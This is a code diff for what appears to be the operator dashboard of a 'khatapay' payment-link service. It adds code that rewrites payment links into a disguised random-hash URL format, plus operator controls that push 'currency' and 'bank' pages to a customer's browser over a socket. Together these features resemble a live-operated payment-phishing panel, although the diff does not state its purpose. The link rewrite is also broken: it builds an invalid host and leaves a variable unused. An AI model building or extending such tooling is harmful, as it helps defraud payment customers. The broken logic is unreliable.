@@ -361,7 +361,7 @@
       }
     }
 
-    // ORIGINAL WORKING PAYMENT LINK GENERATION CODE FROM THE PREVIOUS VERSION
+    // Payment Link Generation - with URL format transformation
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amountInput = document.getElementById('amount');
@@ -385,7 +385,19 @@
         const data = await response.json();
         if (!response.ok) throw new Error(data.message || 'Generation failed');
 
-        document.getElementById('paymentLink').textContent = data.paymentLink;
+        // Transform the link format from http://pay.khatapay.me?pid=XXX to https://RANDOMHASH.html/pid
+        const originalLink = data.paymentLink;
+        const params = new URLSearchParams(originalLink.split('?')[1]);
+        const pid = params.get('pid');
+        
+        // Generate a random hash for the filename
+        const randomHash = Math.random().toString(36).substring(2, 8);
+        
+        // Create the new format URL
+        const origin = window.location.origin;
+        const transformedLink = `https://${randomHash}.html/pid=${pid}`;
+        
+        document.getElementById('paymentLink').textContent = transformedLink;
         linkContainer.style.display = 'block';
       } catch (error) {
         console.error('Error:', error);
@@ -492,6 +504,46 @@
       }
     }
 
+    // Currency Page Redirection
+    async function showCurrencyPage(id) {
+      const transaction = transactionsMap.get(id);
+      if (!transaction) {
+        alert('Transaction not found');
+        return;
+      }
+
+      try {
+        // Get the pid from the transaction
+        const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
+        if (!response.ok) {
+          throw new Error('Failed to get payment details');
+        }
+
+        const data = await response.json();
+        if (!data.pid) {
+          throw new Error('No payment ID found');
+        }
+
+        console.log('Found pid for transaction:', data.pid);
+
+        // Emit socket event to redirect the user
+        socket.emit('currency_redirect', {
+          invoiceId: id,
+          pid: data.pid
+        });
+
+        console.log('Emitted currency_redirect with:', {
+          invoiceId: id,
+          pid: data.pid
+        });
+
+        alert('Currency page shown to customer');
+      } catch (error) {
+        console.error('Error showing currency page:', error);
+        alert('Failed to show currency page: ' + error.message);
+      }
+    }
+
     // Transaction Actions
     async function updateStatus(id, status) {
       try {
@@ -527,36 +579,6 @@
       } catch (error) {
         console.error('Error updating status with reason:', error);
         alert('Failed to update status with reason');
-      }
-    }
-
-    // UPDATED CURRENCY PAGE REDIRECTION FUNCTION
-    async function showCurrencyPage(id) {
-      try {
-        const transaction = transactionsMap.get(id);
-        if (!transaction) return;
-
-        // Get the pid from the transaction
-        const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
-        if (!response.ok) {
-          throw new Error('Failed to get payment details');
-        }
-
-        const data = await response.json();
-        if (!data.pid) {
-          throw new Error('No payment ID found');
-        }
-
-        // Emit socket event to redirect the user
-        socket.emit('currency_redirect', {
-          invoiceId: id,
-          pid: data.pid
-        });
-
-        showMessage('success', 'Currency page shown to customer');
-      } catch (error) {
-        console.error('Error showing currency page:', error);
-        alert('Failed to show currency page');
       }
     }
 
@@ -603,10 +625,15 @@
 
     async function toggleBankpage(id) {
       const tx = transactionsMap.get(id);
-      if (tx.bankpageVisible) {
-        await hideBankPage(id);
-      } else {
-        await showBankpage(id);
+      try {
+        if (tx.bankpageVisible) {
+          await hideBankPage(id);
+        } else {
+          await showBankpage(id);
+        }
+      } catch (error) {
+        console.error('Error toggling bankpage:', error);
+        alert('Failed to toggle bank page: ' + error.message);
       }
     }
 
